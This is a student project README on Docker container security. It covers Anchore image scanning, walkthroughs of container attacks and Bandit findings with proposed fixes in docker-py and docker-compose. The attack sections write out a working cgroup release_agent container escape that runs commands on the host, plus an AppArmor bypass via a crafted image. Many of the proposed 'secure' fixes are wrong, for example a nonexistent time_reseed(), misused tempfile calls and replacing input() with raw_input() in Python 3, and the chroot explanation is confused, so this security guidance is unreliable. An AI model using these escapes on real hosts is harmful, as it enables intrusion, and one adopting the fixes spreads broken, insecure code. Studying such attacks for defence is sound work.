# Securing_Open_Source_Components_on_Containers
Code for HPE Project  

Team Members:
1. Prishita Ray- 17BCE2405
2. Tanmayi Nandan- 17BCI0039
3. V Bhavyashri Vedula- 17BCI0115
4. Saripella Vivekananda Verma- 17BCI0104  

Mentor:
Prof. K.S.Umadevi

Steps to install Docker on Linux Ubuntu 18.04 is available at the following link:
https://www.digitalocean.com/community/tutorials/how-to-install-and-use-docker-on-ubuntu-18-04

Tools that we can use for scanning: Anchore, Clair, Dadga, OpenSCAP, Sysdig Falco
https://opensource.com/article/18/8/tools-container-security 

**Level 1 Report access link:** https://docs.google.com/document/d/1dG2JSPOpljgbQkomYFa5qfXsCrxvhX7X_D0P0upiB2E/edit#heading=h.mbjsiz6n6jlo  

**Level 2 Report access link:**   
https://docs.google.com/document/d/1l2zWXEsoBHJLobd672CToT_eyFsD1ykeHukVMs5Kj4k/edit?usp=sharing

**Level 3 and Final Report access link:**   
https://docs.google.com/document/d/1rj6SNAlkzTvJk865XmPAKtm4owbZruoQgVmQo82hb-8/edit#

## Vulnerabilities reported by Anchore-Engine using CLI on Docker Debian Image

The Vulnerability Report was obtained using the following procedure:
1. Upgrade Windows 10 Home Edition to Windows 10 Education Edition
2. Install Docker Desktop for Windows and configure
3. Go to the following webpage: [Anchore Docker YAML file](https://docs.anchore.com/current/docs/engine/quickstart/docker-compose.yaml), right-click and save as docker-compose.yaml to your Desktop
4. Start Docker Desktop
5. Open Windows Powershell (Not as admin)
6. Move to your Desktop folder using cd/Desktop
7. Execute the command: 

		docker-compose up -d

8. Install the Command Line Interface (CLI) using 

		pip install anchorecli

9. Type and execute command: 

		anchore-cli --u admin --p foobar --url http://localhost:8228/v1 image add docker.io/library/debian:latest

to scan the debian Docker container for vulnerabilities.

10. Next execute: 

		anchore-cli --u admin --p foobar --url http://localhost:8228/v1 image wait docker.io/library/debian:latest

Wait for the status to change from Analyzing to Analyzed
11. To get the list of images being scanned for vulnerabilities, execute: 

		anchore-cli --u admin --p foobar --url http://localhost:8228/v1 image list

![alt text](https://github.com/PRISHIta123/Securing_Open_Source_Components_on_Containers/blob/master/image_list.JPG)

12. For image overview and summary information, execute: 

		anchore-cli --u admin --p foobar --url http://localhost:8228/v1 image get docker.io/library/debian:latest

![alt text](https://github.com/PRISHIta123/Securing_Open_Source_Components_on_Containers/blob/master/debian_details.JPG)


13. Finally to get the list of vulnerabilities, run this command: 

		anchore-cli --u admin --p foobar --url http://localhost:8228/v1 system feeds list

It will return the following output:

![alt text](https://github.com/PRISHIta123/Securing_Open_Source_Components_on_Containers/blob/master/vulnerabilities.JPG)

14. Details of CVE vulnerabilities reported are as follows:

		anchore-cli --u admin --p foobar --url http://localhost:8228/v1 image vuln docker.io/library/debian:latest os

CVE reports:

![alt text](https://github.com/PRISHIta123/Securing_Open_Source_Components_on_Containers/blob/master/cve_tags1.JPG)

![alt text](https://github.com/PRISHIta123/Securing_Open_Source_Components_on_Containers/blob/master/cve_tags2.JPG)

![alt text](https://github.com/PRISHIta123/Securing_Open_Source_Components_on_Containers/blob/master/cve_tags3.JPG)

15. Image Policy Evaluation:

		anchore-cli --u admin --p foobar --url http://localhost:8228/v1 evaluate check docker.io/library/debian:latest

![alt text](https://github.com/PRISHIta123/Securing_Open_Source_Components_on_Containers/blob/master/policy.JPG)  

### Security Scanning Report
The report of the CVE violations can be accessed at the following link:
https://docs.google.com/document/d/1DJDDFI02oXyvEloXb_i1AlexnhXto5zzqFN0pwCNz18/edit?usp=sharing

## Exploiting Vulnerabilities on Docker Containers

Samples provided-  
1. Rancher Server: 
https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/linux/http/rancher_server.md  
2. Unprotected TCP socket: 
https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/linux/http/docker_daemon_tcp.md  
3. Apparmor: 
https://github.com/opencontainers/runc/issues/2128  

Other CVE details- https://www.cvedetails.com/vendor/13534/Docker.html

### Exploiting Chroot (Change root) CVE_2015_6240

Reference: https://btholt.github.io/complete-intro-to-containers/chroot

In this vulnerability, a hacker can create his own new root directory, different from the original, or gain access to the directory, for which he previously had write access, from which it is not possible to escape, and hence confidential information can be compromised. The below steps describe how this vulnerability can be exploited by an unauthorized user:  

1. Invoke and run the ubuntu bionic 18.04 docker container from the Windows Powershell by pulling its image from Docker Hub 

		docker run -it --name docker-host --rm --privileged ubuntu:bionic

2. Check the ubuntu version of the container after you are in root

		cat /etc/issue/

![alt text](https://github.com/PRISHIta123/Securing_Open_Source_Components_on_Containers/blob/master/ubuntu_version.JPG) 

3. Create a new folder for your new root directory from the original

		mkdir /my-new-root                                                                                      

4. Create a new file within the new root directory titled secret.txt

		 echo "my super secret thing" >> /my-new-root/secret.txt                                                                          

5. To ensure that a bash file is present for the new root directory copy it from the original

		cp /bin/bash /bin/ls /my-new-root/bin/                                                                              

Also, add create lib and lib64 directories to bash to contain libraries for x86 and 64 bit systems:

		mkdir /my-new-root/lib /my-new-root/lib64                                                                                

6. To copy the libraries within bash, first list them out:

		ldd /bin/bash                                                                                     

![alt text](https://github.com/PRISHIta123/Securing_Open_Source_Components_on_Containers/blob/master/bin_bash.JPG)

7. Then copy them to the new root directory /lib and /lib64 

		cp /lib/x86_64-linux-gnu/libtinfo.so.5 /lib/x86_64-linux-gnu/libdl.so.2 /lib/x86_64-linux-gnu/libc.so.6 /my-new-root/lib                                                                         

		cp /lib64/ld-linux-x86-64.so.2 /my-new-root/lib64                                                                                

8. Repeat the same with the files listed in ls

		ldd /bin/ls                 

![alt text](https://github.com/PRISHIta123/Securing_Open_Source_Components_on_Containers/blob/master/bin_ls.JPG)

		cp /lib/x86_64-linux-gnu/libtinfo.so.5 /lib/x86_64-linux-gnu/libdl.so.2 /lib/x86_64-linux-gnu/libc.so.6 /my-new-root/lib                                                                         

		cp /lib/x86_64-linux-gnu/libpthread.so.0 /my-new-root/lib               

		cp /lib64/ld-linux-x86-64.so.2 /my-new-root/lib64 

9. Change the current root directory by running the command chroot

		chroot /my-new-root bash 

10. To see the contents of the new root directory, use ls. Everything in the original directory can be seen here. But when we try to check the present working directory it shows /, implying that it considers the new root directory as the actual one, instead of the original, and there is no way of navigating back to it, leading to a compromise on authentication and hence, a vulnerability. 

![alt text](https://github.com/PRISHIta123/Securing_Open_Source_Components_on_Containers/blob/master/jail.JPG)




### Exploiting Chmod (Change mode) EDB-ID:47147

Reference: https://www.exploit-db.com/exploits/47147

#### On the host
	docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash
The above command specifies Docker to run with SYS-ADMIN capabilities and with no security ( --security-opt apparmor=unconfined). 
	
![alt text](https://github.com/PRISHIta123/Securing_Open_Source_Components_on_Containers/blob/master/docker_sysadmin.PNG)

The SYS_ADMIN capability allows a container to perform the mount syscall. Docker starts containers with a restricted set of capabilities by default and does not enable the SYS_ADMIN capability due to the security risks of doing so.
Further, Docker starts containers with the docker-default AppArmor policy by default, which prevents the use of the mount syscall even when the container is run with SYS_ADMIN.



#### In the container
	mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
To trigger this exploit we need a cgroup where we can create a release_agent file and trigger release_agent invocation by killing all processes in the cgroup. To do that, we create a /tmp/cgrp directory, mount the RDMA cgroup controller and create a child cgroup (named “x”).

	echo 1 > /tmp/cgrp/x/notify_on_release
	host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
	echo "$host_path/cmd" > /tmp/cgrp/release_agent
Next, we enable cgroup notifications on release of the “x” cgroup by writing a 1 to its notify_on_release file. We also set the RDMA cgroup release agent to execute a /cmd script — which we will later create in the container — by writing the /cmd script path on the host to the release_agent file. To do it, we’ll grab the container’s path on the host from the /etc/mtab file.

	echo '#!/bin/sh' > /cmd
	echo "ps aux > $host_path/output" >> /cmd
	chmod a+x /cmd
Now, we create the /cmd script such that it will execute the ps aux command and save its output into /output on the container by specifying the full path of the output file on the host. The chmod command is used to assign execute privilege to everyone. 

	sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"	
Finally, we can execute the attack by spawning a process that immediately ends inside the “x” child cgroup. By creating a /bin/sh process and writing its PID to the cgroup.procs file in “x” child cgroup directory, the script on the host will execute after /bin/sh exits. The output of ps aux performed on the host is then saved to the /output file inside the container.

![alt text](https://github.com/PRISHIta123/Securing_Open_Source_Components_on_Containers/blob/master/chmod.PNG)

	head /output

![alt text](https://github.com/PRISHIta123/Securing_Open_Source_Components_on_Containers/blob/master/chmod_attack.PNG)	

### Exploiting AppArmor bypass vulnerability (CVE-2019-16884)
runc through 1.0.0-rc8, as used in Docker through 19.03.2-ce and other products, allows AppArmor restriction bypass because libcontainer/rootfs_linux.go incorrectly checks mount targets, and thus a malicious Docker image can mount over a /proc directory.

Create parent directory:
	
	mkdir -p rootfs/proc/self/{attr,fd}
	
Normally, checkMountDestinations is supposed to prevent mounting on top of /proc. But it does not prevent us from mounting. The reason is that the dest argument is resolved to an absolute path using securejoin.SecureJoin, unlike the blacklist in checkMountDestinations, which is relative to the rootfs.

Create new files in the respective directory:
	
	touch rootfs/proc/self/{status,attr/exec}
	touch rootfs/proc/self/fd/{4,5}

Mount the volume by adding to the dockerfile using cat command:
		
		cat <<EOF > Dockerfile
		FROM busybox
		ADD rootfs /
		VOLUME /proc
		EOF
		
Busybox is a program that can perform the actions of many common unix programs, such as ls, chmod, wget, cat, etc. Most commonly, it's used in embedded Linux due to its small executable size.

![alt text](https://github.com/PRISHIta123/Securing_Open_Source_Components_on_Containers/blob/master/apparmor.PNG)	

Build a docker image from the modified Dockerfile and assign it a tag called apparmor-bypass

	sudo docker build -t apparmor-bypass .

Run the docker image:

	sudo docker run --rm -it --security-opt "apparmor=docker-default"  apparmor-bypass

![alt text](https://github.com/PRISHIta123/Securing_Open_Source_Components_on_Containers/blob/master/apparmor_attack.PNG)	

As we can see, the container runs unconfined.
While checking for process status, we can see that the docker daemon is running unconfined:

![alt text](https://github.com/PRISHIta123/Securing_Open_Source_Components_on_Containers/blob/master/process_status.PNG)	

## Securing vulnerabilities in docker images  

To identify vulnerablilties in the component codes, we will be using the Bandit Command Line Tool. Bandit is a tool designed to find common security issues in Python code. To do this Bandit processes each file, builds an AST from it, and runs appropriate plugins against the AST nodes. Once Bandit has finished scanning all the files it generates a report.

### Docker-py Open Source Component

A Python library for the Docker Engine API. It lets you do anything the docker command does, but from within Python apps – run containers, manage containers, manage Swarms, etc.  

Link to repo: https://github.com/docker/docker-py

To run the bandit tool on this component execute:

	cd Desktop/docker-py-master
	bandit -r docker-py-master
	
![alt text](https://github.com/PRISHIta123/Securing_Open_Source_Components_on_Containers/blob/master/py1.JPG)

Scan Reports:  
![alt text](https://github.com/PRISHIta123/Securing_Open_Source_Components_on_Containers/blob/master/py2.JPG)

Vulnerabilities Reported with Code Locations:  
![alt text](https://github.com/PRISHIta123/Securing_Open_Source_Components_on_Containers/blob/master/py3.JPG)

##### Vulnerabilities Identified and Secured

The following list of vulnerabilities were detected by bandit in Docker-py. Corrections to prevent them and secure the code have been proposed as follows:

#### 1. Use of assert

Path:- Docker-py->docker->api->client.py
Issue:  [B101:assert_used] Use of assert detected. The enclosed code will be removed when compiling to optimised byte code.

![alt text](https://github.com/PRISHIta123/Securing_Open_Source_Components_on_Containers/blob/master/i1.JPG)

It is generally observed that some projects use assert to enforce interface constraints. However, assert is removed with compiling to optimised byte code (python -o producing *.pyo files). This caused various protections to be removed. This can cause assertion unreachable security issue.
#### Severity: Low
#### Confidence: Low

Solution to Secure :
The code has to be changed  at line 266 like this:

    self.assertFalse(json and binary);
    
In many places this same security issue is observed. But as this was explained here again not repeated down. For all issues the solution is similar. According to expression we can use assertEqual, assertNotEqual,assertTrue,…

#### 2. Security Implications with Subprocess modules
 

Path:- Docker-py->docker->credentials->store.py
Issue:  [B404:blacklist] Consider possible security implications associated with subprocess module.

![alt text](https://github.com/PRISHIta123/Securing_Open_Source_Components_on_Containers/blob/master/i2.JPG)

##### Severity: Low  
##### Confidence: High
Consider possible security implications associated with subprocess module. Python possesses many mechanisms to invoke an external executable. However, doing so may invoke a security issue if appropriate care is not taken to sanitize any user provided or variable input. When spawning of a subprocess without the use of a command shell has taken place it causes security issue. This type of subprocess invocation is not vulnerable to shell injection attacks, but care should still be taken to ensure validity of input.

Solution to Secure :
The code where subprocess.Popen() is invoked, one must add the parameter shell=False. The benefit of not calling via the shell is that you are not invoking a 'mystery program.' Setting the shell argument to a true value causes subprocess to spawn an intermediate shell process, and tell it to run the command. In other words, using an intermediate shell means that variables, glob patterns, and other special shell features in the command string are processed before the command is run.

#### 3. Possible shell injection via Paramiko call

 
Path:- Docker-py->docker->transport->sshconn.py
Issue:  [B601:paramiko_calls] Possible shell injection via Paramiko call, check inputs are properly sanitized.

![alt text](https://github.com/PRISHIta123/Securing_Open_Source_Components_on_Containers/blob/master/i3.JPG)

##### Severity: Medium
##### Confidence: Medium
Paramiko is a Python library designed to work with the SSH2 protocol for secure (encrypted and authenticated) connections to remote machines. It is intended to run commands on a remote host. These commands are run within a shell on the target and are thus vulnerable to various shell injection attack.

Solution to Secure :
In line number 34, the following command is executed:
sock.exec_command('docker system dial-stdio')
Bandit reports a MEDIUM issue when it detects the use of Paramiko’s “exec_command” method advising the user to check inputs are correctly sanitized. One way to sanitize the input is:


    def shell_escape(arg):
    return "'%s'" % (arg.replace(r"'", r"'\''"), )
    
This works because enclosing characters in single-quotes ( '' ) shall preserve the literal value of each character within the single-quotes. A single-quote cannot occur within single-quotes.

#### 4. Hard coded Passwords
 
Path:- Docker-py->tests->integration->credentials->store_test.py
Issue: [B106:hardcoded_password_funcarg] Possible hard coded password: 'pass'

![alt text](https://github.com/PRISHIta123/Securing_Open_Source_Components_on_Containers/blob/master/i4.JPG)

##### Severity: Low  
##### Confidence: High
The use of hard-coded passwords increases the possibility of password guessing tremendously.

Solution to Secure : 
Instead of Hard coding the password, Hashing mechanisms must be used to prevent attackers from cracking the password using Brute force mechanisms.
An alternative to hard coding of passwords is reading the password from a file without copying the file itself, and storing the hashed password in a separate file.
Some of the hashing techniques used in Python are:
Generic hashing algorithms such as SHA-256, MD5, etc.
PBKDF2 is a key derivation function where the user can set the computational cost; this aims to slow down the calculation of the key to make it more impractical to brute force. In usage terms, it takes a password, salt and a number of iterations to produce a certain key length which can also be compared to a hash as it is also a one-way function.

#### 5. Possible binding to all interfaces
 
Path:- Docker-py->tests->unit->fake_api.py
Issue:  [B104:hardcoded_bind_all_interfaces] Possible binding to all interfaces.

![alt text](https://github.com/PRISHIta123/Securing_Open_Source_Components_on_Containers/blob/master/i5.JPG)

##### Severity: Medium
##### Confidence: Medium
Binding to all network interfaces can potentially open up a service to traffic on unintended interfaces, that may not be properly documented or secured. Here the string pattern “0.0.0.0” is detected that indicate a hardcoded binding to all network interfaces.

Solution to Secure :
This vulnerability is reported with CVE-2018-1281. A security patch for the same has also been proposed.
Link: https://github.com/dmlc/ps-lite/commit/4be817e8b03e7e92517e91f2dfcc50865e91c6ea

#### 6. Chmod setting a permissive mask 0o222 on full_path

Path:- Docker-py->tests->unit->utils_build_test.py
Issue:  [B103:set_bad_file_permissions] Chmod setting a permissive mask 0o222 on full_path.

![alt text](https://github.com/PRISHIta123/Securing_Open_Source_Components_on_Containers/blob/master/i6.JPG)

##### Severity: High
##### Confidence: High.
POSIX based operating systems utilize a permissions model to protect access to parts of the file system. This model supports three roles “owner”, “group” and “world” each role may have a combination of “read”, “write” or “execute” flags sets. Python provides chmod to manipulate POSIX style permissions.  Here, Chmod sets a permissive mask 0o222 on file (full_path) which is quite dangerous.

Solution to Secure :
Files should be created with restrictive file permissions to prevent vulnerabilities such as information disclosure and code execution. The permissive mask 0o222 sets the files to writable by all. This should be changed to chmod 600 file so that only the owner can read and write.


#### 7. Probable insecure usage of temp file/directory


Path: docker-py-master\tests\unit\api_container_test.py:911
Path: docker-py-master\tests\unit\api_container_test.py:922
Issue: [B108:hardcoded_tmp_directory] Probable insecure usage of temp file/directory.

![alt text](https://github.com/PRISHIta123/Securing_Open_Source_Components_on_Containers/blob/master/i7.JPG)

##### Severity: Medium   
##### Confidence: Medium
Safely creating a temporary file or directory means following a number of rules (see the references for more details). This plugin test looks for strings starting with (configurable) commonly used temporary paths, for example:
/tmp
/var/tmp
/dev/shm
/etc
This test plugin takes a similarly named config block, hardcoded_tmp_directory. The config block provides a Python list, tmp_dirs, that lists string fragments indicating possible temporary file paths. Any string starting with one of these fragments will report a MEDIUM confidence issue.

Solution to Secure:
By default, replication programs use the /tmp directory for temporary files. In some cases, these files might be deleted by other programs with root privilege.
An alternative is the use of the TMPDIR environment variable to specify a temporary directory.
Replace the code on line 898 of api_container_test.py as follows:

    “/tmp”: “”
 to
 
    TMPDIR = “”

#### 8. Use of exec detected


Path: docker-py-master\docs\conf.py:73
Issue: [B102:exec_used] Use of exec detected.

![alt text](https://github.com/PRISHIta123/Securing_Open_Source_Components_on_Containers/blob/master/i8.JPG)

##### Severity: Medium   
##### Confidence: High
The Python docs succinctly describe why the use of exec is risky. 
This function supports dynamic execution of Python code. object must be either a string or a code object. If it is a string, the string is parsed as a suite of Python statements which is then executed (unless a syntax error occurs). 1 If it is a code object, it is simply executed. In all cases, the code that’s executed is expected to be valid as file input.

Solution to Secure:
According to researchers, the only safe way to use eval or exec is not to use them.
An alternative suggested is instead of building a string to execute, it can be parsed into objects, and these objects can be used to drive the code execution.
Another suggestion is the storing of the functions in a Python dictionary (Dict) and then using a string to select the function to call. 


#### 9. Standard pseudo-random generators are not suitable for security/cryptographic purposes.



Path: docker-py-master\tests\helpers.py:108
Issue: [B311:blacklist] Standard pseudo-random generators are not suitable for security/cryptographic purposes.

![alt text](https://github.com/PRISHIta123/Securing_Open_Source_Components_on_Containers/blob/master/i9.JPG)

##### Severity: Low   
##### Confidence: High

Solution to Secure :
An alternative that can be used instead of the random() function to avoid this vulnerability is:
time_reseed() 
The reseed() function works similar to the initialization algorithm. If you call time_reseed() some bits of new randomness from time() is added to the state.

### Docker Compose Open Source Component 

Compose is a tool for defining and running multi-container Docker applications. With Compose, you use a Compose file to configure your application's services. Then, using a single command, you create and start all the services from your configuration. 

Link to repo: https://github.com/docker/compose

To run the bandit tool on this component execute:

	cd Desktop/compose
	bandit -r compose
	
![alt text](https://github.com/PRISHIta123/Securing_Open_Source_Components_on_Containers/blob/master/compose1.JPG)

Scan Reports:  
![alt text](https://github.com/PRISHIta123/Securing_Open_Source_Components_on_Containers/blob/master/compose2.JPG)

Vulnerabilities Reported with Code Locations:  
![alt text](https://github.com/PRISHIta123/Securing_Open_Source_Components_on_Containers/blob/master/compose3.JPG)

	
##### Vulnerabilities Identified and Secured

The following list of vulnerabilities were detected by bandit in Docker-py. Corrections to prevent them and secure the code have been proposed as follows:

The following list of vulnerabilities were detected by bandit in Docker compose. Corrections to prevent them and secure the code have been proposed as follows:  

1. Issue: [B108:hardcoded_tmp_directory] Probable insecure usage of temp file/directory.   
File path- compose\tests\unit\service_test.py:1462  

![alt text](https://github.com/PRISHIta123/Securing_Open_Source_Components_on_Containers/blob/master/ss1.JPG)

##### Severity: Medium   
##### Confidence: Medium  

Safely creating a temporary file or directory means following a number of rules (see the references for more details). This plugin test looks for strings starting with (configurable) commonly used temporary paths, for example:  
*/tmp  
*/var/tmp  
*/dev/shm  
*/etc  

This test plugin takes a similarly named config block, hardcoded_tmp_directory. The config block provides a Python list, tmp_dirs, that lists string fragments indicating possible temporary file paths. Any string starting with one of these fragments will report a MEDIUM confidence issue.


**Solution to Secure:**  
Replace the code on line 1462 of service_test.py as follows:  

	volume = '/tmp:/foo:z'
 to  
 
 	volume = tempfile.gettempdir('foo:z')  

The reason the original command does not work is because a tmp directory may store a predefined value in the user’s computer, for example: C:/Users/Username or a root directory that an attacker may get access to, and compromise the privacy of other files that are also contained within the same temporary directory. However, the second replaced command creates a temporary directory (unknown to the attacker) specifically for the file at runtime, and is therefore, more secure.  


2.  Issue: [B104:hardcoded_bind_all_interfaces] Possible binding to all interfaces  
File path- compose\tests\unit\container_test.py:125 

![alt text](https://github.com/PRISHIta123/Securing_Open_Source_Components_on_Containers/blob/master/ss2.JPG)

##### Severity: Medium   
##### Confidence: Medium  

Binding to all network interfaces can potentially open up a service to traffic on unintended interfaces, that may not be properly documented or secured. This plugin test looks for a string pattern “0.0. 0.0” that may indicate a hardcoded binding to all network interfaces.

**Solution to Secure:**  
Replace the code on line 125 of container_test.py as follows:

	self.container_dict['NetworkSettings']['Ports'].update({
            "45454/tcp": [{"HostIp": "0.0.0.0", "HostPort": "49197"}],
            "45453/tcp": [],
        })
 to  
 
 	self.container_dict['NetworkSettings']['Ports'].update({
            "45454/tcp": [{"HostIp": "192.168.43.27", "HostPort": "49197"}],
            "45453/tcp": [],
        })
 	  

If the HostIP listens add port 0.0.0.0, it is not a secure connection, as it gains access to all connected devices at the same gateway. However, if the HostIP is set to only the IPV4 address of the host computer (that can be found by issuing the ipconfig command in cmd prompt of Windows), it listens only at the designated port, thus limiting access to other computers and making the connection more secure.  


3.Issue: [B306:blacklist] Use of insecure and deprecated function (mktemp)   
File path- compose\compose\service.py:1776

![alt text](https://github.com/PRISHIta123/Securing_Open_Source_Components_on_Containers/blob/master/ss3.JPG)

##### Severity: Medium   
##### Confidence: High

Functions that create temporary file names (such as tempfile.mktemp and os.tempnam) are fundamentally insecure, as they do not ensure exclusive access to a file with the temporary name they return. The file name returned by these functions is guaranteed to be unique on creation but the file must be opened in a separate operation. There is no guarantee that the creation and open operations will happen atomically. This provides an opportunity for an attacker to interfere with the file before it is opened.
Note that mktemp has been deprecated since Python 2.3.  


**Solution to Secure:**  
Replace the code on line 1776 of service.py as follows:  

	iidfile = tempfile.mktemp()
 to  
 
 	idfile = tempfile.mkstemp()

Unlike mktemp , mkstemp is actually guaranteed to create a unique file that cannot possibly clash with any other program trying to create a temporary file. This is because it works by calling open with the O_EXCL flag, which says you want to create a new file and get an error if the file already exists

4.Issue: [B322:blacklist] The input method in Python 2 will read from standard input, evaluate and run the resulting string as python source code. This is similar, though in many ways worse, then using eval.
File path- compose\script\release\utils.py:35

![alt text](https://github.com/PRISHIta123/Securing_Open_Source_Components_on_Containers/blob/master/ss4.JPG)

##### Severity: High  
##### Confidence: High

In Python 3, the raw_input() function was erased, and it’s functionality was transferred to a new built-in function known as input().
There are two common methods to receive input in Python 2.x:
*Using the input() function: This function takes the value and type of the input you enter as it is without modifying any type.
*Using the raw_input() function : This function explicitly converts the input you give to type string

The vulnerability in input() method lies in the fact that the variable accessing the value of input can be accessed by anyone just by using the name of the variable or method. The vulnerability can even provide the name of a function as input and access values that are otherwise not meant to be accessed.  


**Solution to Secure:**  
Replace the code on line 1776 of service.py as follows:  

	answer = input(prompt).strip().lower()
 to  
 
 	answer = raw_input(prompt).strip().lower()

 In the original case, the variable having the value of input variable is able to access the value of the input variable directly.
It evaluates the variable as if a number was directly entered, by which means it returns a True Boolean always. Using raw_input, it would not be possible as it disallows to read the variable directly. This helps to secure access to private data members as well as functions in a code. 



